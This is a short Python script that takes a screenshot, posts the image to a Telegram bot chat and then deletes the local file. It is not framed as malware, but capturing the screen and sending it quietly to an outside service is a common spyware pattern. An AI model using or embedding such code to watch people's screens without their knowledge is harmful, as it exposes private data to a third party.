import os 
import datetime
import requests 
from PIL import ImageGrab
from dotenv import load_dotenv

load_dotenv()
# Bot info and chat id 
API_TOKEN = os.getenv('API_TOKEN') 
CHAT_ID  = os.getenv('CHAT_ID')

def send_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot_file = f'screenshot_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.png'
        screenshot.save(screenshot_file)

        with open(screenshot_file, "rb") as file:
            response = requests.post(f'https://api.telegram.org/bot{API_TOKEN}/sendPhoto', data={'chat_id': CHAT_ID}, files={'photo': file})
            print(response.json())

        os.remove(screenshot_file)
    except Exception as e:
        print(f"Error taking or sending screenshot: {str(e)}")

